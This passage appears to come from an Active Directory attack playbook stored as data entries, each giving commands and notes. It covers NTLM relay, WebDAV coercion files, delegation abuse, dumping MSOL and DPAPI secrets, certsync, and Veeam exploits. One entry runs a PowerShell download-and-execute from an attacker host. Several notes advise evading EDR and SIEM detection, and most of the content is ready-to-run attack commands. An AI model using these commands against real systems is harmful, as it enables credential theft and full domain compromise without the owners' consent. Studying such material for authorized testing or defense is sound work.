cmd:"# Set fixed challenge in /etc/responder/Responder.conf: Challenge=1122334455667788\nresponder -I {INTERFACE} --lm\nimpacket-ntlmrelayx -smb2support -t ldap://{DC_IP} --remove-mic",
failureIndicators:['NTLMv1 not in use on network','SMB signing enforced on relay target','DC rejects NTLMv1'],
notes:'NTLMv1 is drastically weaker than NTLMv2. When NTLMv1 is detected, set the Responder challenge to 1122334455667788 (fixed). The NTLMv1 response with this fixed challenge maps directly to the NT hash via rainbow tables at crack.sh — no GPU needed, results in seconds. Also use --remove-mic with ntlmrelayx to strip the MIC field, allowing cross-protocol relay even with partial channel binding enforcement. Check for NTLMv1: review Responder statistics after a capture session. Look for shorter hashes in Responder output compared to standard NTLMv2.'},
{id:'COERCE_004',phase:'credential-access',title:'WebDAV Coerce via .searchConnector-ms',desc:'Drop a WebDAV file to silently coerce HTTP auth from any user who opens the folder',tool:'Responder/ntlmrelayx',os:'linux',noise:'low',auth:'required',
cmd:"cat > @steal.searchConnector-ms << 'EOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<searchConnectorDescription>\n<isSearchOnlyItem>false</isSearchOnlyItem>\n<includeInStartMenuScope>false</includeInStartMenuScope>\n<templateInfo><folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType></templateInfo>\n<simpleLocation><url>http://{ATTACKER_IP}@80/x</url></simpleLocation>\n</searchConnectorDescription>\nEOF\n# Upload to writable share — runs automatically when folder is opened",
failureIndicators:['WebClient service not running on target','Firewall blocks outbound HTTP port 80','File not opened by any user'],
notes:'A .searchConnector-ms file auto-executes when a user browses the folder containing it — no click required, just opening the folder in Explorer triggers an outbound HTTP WebDAV authentication attempt. Drop it on a writable SMB share that users regularly access. The coercion is HTTP (not SMB), so it works for HTTP to LDAP relay even when LDAP signing blocks SMB to LDAP — see RELAY_002. The @steal.url Windows Internet Shortcut (with [InternetShortcut] URL=\\{ATTACKER_IP}@80\\x) and .scf files with IconFile=\\{ATTACKER_IP}\\x have the same effect. Use the @ prefix so these files sort to the top of the directory listing.'},
{id:'COERCE_005',phase:'credential-access',title:'Add Rogue DNS A Record for Coerce',desc:'Register a new DNS hostname pointing to attacker IP to trigger automatic client connections',tool:'dnstool',os:'linux',noise:'med',auth:'required',
cmd:"python3 dnstool.py -u '{DOMAIN}\\{USERNAME}' -p '{PASSWORD}' -a add -r {FAKE_HOSTNAME} -d {ATTACKER_IP} {DC_IP}\n# Wait for SCCM auto push or trigger manually\n# Cleanup after:\npython3 dnstool.py -u '{DOMAIN}\\{USERNAME}' -p '{PASSWORD}' -a remove -r {FAKE_HOSTNAME} {DC_IP}",
failureIndicators:['DNS dynamic update denied','Dynamic DNS disabled','No service watching for new hosts'],
notes:'Any domain user can add DNS records by default — the DACL on the MicrosoftDNS container allows authenticated users to create records. Register a fake hostname pointing to your attacker IP. Services that automatically connect to new hostnames — SCCM client push, Exchange autodiscover, print spooler coerce — will connect and authenticate. Combined with ntlmrelayx this yields credentials or relay opportunities without active coercion tools. Particularly effective in SCCM environments (see SCCM_009). Always cleanup: remove the DNS record after the engagement to avoid persistence artifacts.'},
{id:'COERCE_006',phase:'credential-access',title:'Enable WebClient Service (Enable WebDAV)',desc:'Silently start the WebClient service on a target to enable WebDAV-based coercion',tool:'PetitPotam/search-ms',os:'windows',noise:'med',auth:'required',
cmd:"# Via search-ms URI (no local admin needed):\nStart-Process 'search-ms:query=test&crumb=location:\\\\{ATTACKER_IP}@80\\x'\n# Or force via .searchConnector-ms file that triggers WebClient start\n# Or with local admin:\nnet start WebClient\nSC.exe config WebClient start=auto",
failureIndicators:['WebClient start blocked by policy','Service manager denied','WebClient disabled via GPO'],
notes:'The WebClient service is required for WebDAV coercion to work — without it, Windows does not make HTTP auth requests when UNC paths use port 80. WebClient is OFF by default on Windows Server but ON on workstations. To enable it without local admin: the search-ms URI scheme triggers an automatic WebClient start when opened. This is a setup step before COERCE_004 or RELAY_002 — first silently start WebClient via the URI trick, then drop the .searchConnector-ms file. On workstations, WebClient is typically already running. Confirm it is running: sc query WebClient or Get-Service WebClient.'},
{id:'DELEG_022',phase:'privilege-escalation',title:'Self-RBCD (No New Computer Account)',desc:'Set RBCD using an existing account instead of creating a new computer account',tool:'Impacket',os:'linux',noise:'med',auth:'required',
cmd:"impacket-rbcd -delegate-from '{USERNAME}' -delegate-to '{TARGET_HOST}$' -dc-ip {DC_IP} -action write '{DOMAIN}/{USERNAME}:{PASSWORD}'\nimpacket-getST -spn 'cifs/{TARGET_HOST}.{DOMAIN}' -impersonate administrator '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec -k -no-pass {DOMAIN}/administrator@{TARGET_HOST}.{DOMAIN}",
failureIndicators:['No write rights on msDS-AllowedToActOnBehalfOfOtherIdentity','Account has no SPN','Machine account quota is not needed but SPN is'],
notes:'Standard RBCD requires creating a new computer account as the delegate-from principal. Self-RBCD eliminates this by using an existing account where you already control the credentials. Your account needs a SPN set — add one via: Set-ADObject -Identity {USERNAME} -Add @{servicePrincipalName="fake/spn"} (requires GenericWrite on yourself). Then set msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer to point to YOUR account. getST then performs S4U2self+S4U2proxy to impersonate administrator. No machine account quota consumption — stealthier than standard RBCD.'},
{id:'DELEG_023',phase:'privilege-escalation',title:'S4U2self Abuse (Service Account Impersonation)',desc:'Use S4U2self on a service account with TRUSTED_TO_AUTH_FOR_DELEGATION to impersonate any user',tool:'Rubeus/Impacket',os:'both',noise:'med',auth:'required',
cmd:"# Linux:\nimpacket-getST -spn 'cifs/{TARGET_HOST}' -impersonate administrator -self '{DOMAIN}/{SVC_ACCOUNT}:{PASSWORD}' -dc-ip {DC_IP}\n# Windows:\n.\\Rubeus.exe s4u /user:{SVC_ACCOUNT} /rc4:{NTHASH} /impersonateuser:administrator /domain:{DOMAIN} /dc:{DC_IP} /self /ptt",
failureIndicators:['Account not trusted for delegation','TRUSTED_TO_AUTH_FOR_DELEGATION flag not set','Forwardable flag missing'],
notes:'S4U2self allows a service to request a TGS for itself on behalf of any user. The resulting ticket is forwardable if the account has TRUSTED_TO_AUTH_FOR_DELEGATION (Protocol Transition) — the UAC flag ADS_UF_TRUSTED_TO_AUTH_FOR_DELEGATION. This is the any-user impersonation primitive. If the account also has constrained delegation (msDS-AllowedToDelegateTo), combine S4U2self and S4U2proxy: get a forwardable self-TGS for admin, then proxy it to the constrained delegation target. Enumerate: Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto.'},
{id:'DELEG_024',phase:'lateral-movement',title:'tgssub — Substitute SPN in Existing Ticket',desc:'Modify the service name in a captured TGS to use it for a different protocol',tool:'tgssub/Impacket',os:'linux',noise:'low',auth:'required',
cmd:"python3 tgssub.py -in ticket.ccache -out newticket.ccache -altservice 'cifs/{TARGET_HOST}'\nexport KRB5CCNAME=newticket.ccache\nimpacket-smbclient -k -no-pass {TARGET_HOST}",
failureIndicators:['SPN substitution blocked by target','Service validation enforced','Ticket not forwardable'],
notes:'tgssub.py (Impacket PR 1256) modifies the SPN in an existing TGS ticket, letting you reuse a captured or requested ticket for a different service on the same host. For example: change HOST/server to CIFS/server for SMB access, or HTTP/server to LDAP/server. The target server typically does not re-validate the SPN inside the ticket. Useful in constrained delegation chains to change the service type, or when you have a ticket for a non-useful service and need a different one. Also called AltService attack. Install current Impacket from git for this tool.'},
{id:'AZUREAD_001',phase:'enumeration',title:'Find Azure AD Connect MSOL Account',desc:'Identify the MSOL sync account used by Azure AD Connect — it has DCSync rights',tool:'NetExec',os:'linux',noise:'low',auth:'required',
cmd:"nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -M get-desc-users | grep -i MSOL\nnxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --users | grep -i MSOL\nGet-ADUser -Filter {Name -like 'MSOL_*'} -Properties Description",
failureIndicators:['No MSOL account found','Azure AD Connect not deployed','LDAP access denied'],
notes:'Azure AD Connect (now Intra ID Connect) synchronizes on-premises AD to Azure AD. It uses a service account named MSOL_XXXXXXXX (random 8-char suffix) that has DCSync rights on-premises — DS-Replication-Get-Changes and DS-Replication-Get-Changes-All — making it an extremely high-value target. The account description usually reads Account created by Microsoft Azure Active Directory Connect. Once found, note the exact username. The next step is to dump its cleartext password from the ADConnect server — see AZUREAD_002. Even with just the MSOL username you can confirm Azure AD Connect is deployed.'},
{id:'AZUREAD_002',phase:'credential-access',title:'Dump MSOL Cleartext Password (ADConnect)',desc:'Extract the MSOL service account cleartext password from the Azure AD Connect server',tool:'azuread_decrypt_msol_v2',os:'windows',noise:'low',auth:'required',
cmd:"# Must run ON the Azure AD Connect server (needs local admin or SYSTEM):\npowershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}/azuread_decrypt_msol_v2.ps1')\"",
failureIndicators:['Not running on ADConnect server','ADSync service not running','Insufficient privileges on ADSync SQL'],
notes:'The MSOL account password is stored encrypted in the Azure AD Connect local database (ADSync SQL instance, usually SQLLocalDB). azuread_decrypt_msol_v2.ps1 reads and decrypts it — requires running as the ADSync service account or as local admin on the ADConnect server. Once you have the MSOL cleartext password, use it for DCSync: impacket-secretsdump {DOMAIN}/MSOL_XXXXXX:{PASSWORD}@{DC_IP}. The MSOL account has DS-Replication-Get-Changes-All so you get all domain hashes. This is a common path from compromising one server (the ADConnect server) to full domain compromise.'},
{id:'AZUREAD_003',phase:'credential-access',title:'certsync — Certificate-Based DCSync',desc:'DCSync using ADCS certificates instead of MS-DRSR replication protocol — evades some detections',tool:'certsync',os:'linux',noise:'med',auth:'required',
cmd:"certsync -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -dc-ip {DC_IP} -ns {DC_IP}",
failureIndicators:['ADCS not deployed','CA not reachable','User lacks DCSync rights','Certificate enrollment denied'],
notes:'certsync performs DCSync by abusing ADCS certificate enrollment rather than the standard MS-DRSR replication protocol. It requests certificates for all domain users using their public keys, then extracts NT hashes from the certificate responses. This bypasses EDR and SIEM rules that specifically detect MS-DRSR DCSync traffic. Requires DCSync-equivalent rights or CA admin. The -ns flag specifies the DNS server for name resolution. Output format matches secretsdump. Useful when standard DCSync is flagged by security tooling but ADCS is accessible.'},
{id:'AZUREAD_004',phase:'credential-access',title:'DonPAPI with PVK Domain Backup Key',desc:'Remote DPAPI dump including domain backup key to decrypt all domain DPAPI secrets',tool:'DonPAPI',os:'linux',noise:'med',auth:'required',
cmd:"donpapi collect -H ':{NTHASH}' {DOMAIN}/{USERNAME}@{TARGET_IP} -t ALL --fetch-pvk\ndonpapi collect -u {USERNAME} -p '{PASSWORD}' {DOMAIN}/{USERNAME}@{CIDR}",
failureIndicators:['DPAPI backup key fetch denied (needs DA)','No DA rights for PVK','SMB access denied'],
notes:'DonPAPI with --fetch-pvk retrieves the domain DPAPI backup key (PVK) from the DC, then uses it to decrypt ALL DPAPI-protected secrets on all targeted machines. The domain backup key can decrypt any DPAPI secret domain-wide and never rotates. Requires DA rights to fetch the PVK. Without PVK it still dumps per-machine DPAPI secrets using local machine keys. Targets include: browser saved credentials, Windows Credential Manager, RDP saved sessions, WiFi passwords, PuTTY keys, SSH keys. Use -t ALL to enable all secret types. Range scan with /24 to dump an entire subnet.'},
{id:'CVE_014',phase:'privilege-escalation',title:'Veeam RCE CVE-2024-40711',desc:'Unauthenticated RCE via deserialization in Veeam Backup and Replication',tool:'VeeamHax',os:'linux',noise:'high',auth:'none',
cmd:"curl -sk https://{TARGET_IP}:9419/api/v1/serverInfo\npython3 VeeamHax.py --target {TARGET_IP} --callback-server {ATTACKER_IP}:{LPORT}",
failureIndicators:['Version patched (>=12.1.2.172)','Port 9419 not open','Callback blocked'],
notes:'CVE-2024-40711: Critical unauthenticated RCE in Veeam Backup and Replication. The .NET deserialization endpoint at /api/v1 accepts unsigned serialized objects. Exploitation yields SYSTEM on the Veeam server. Veeam servers typically have domain admin rights for VSS snapshot access — this is often a direct path to DA. Check version first: curl -sk https://{TARGET_IP}:9419/api/v1/serverInfo. Affected: Veeam B&R 12.1.2.172 and earlier. Patch released September 2024. Check if port 9419 is open: nmap -p 9419 {TARGET_IP}.'},
{id:'CVE_015',phase:'credential-access',title:'Veeam Auth Bypass CVE-2024-29849',desc:'Authentication bypass in Veeam Backup Enterprise Manager — access as any user',tool:'curl',os:'linux',noise:'med',auth:'none',
cmd:"curl -sk -X POST 'https://{TARGET_IP}:9443/api/oauth2/token' -d 'grant_type=authorization_code&code=ANY'\nnmap -p 9443 {TARGET_IP}",
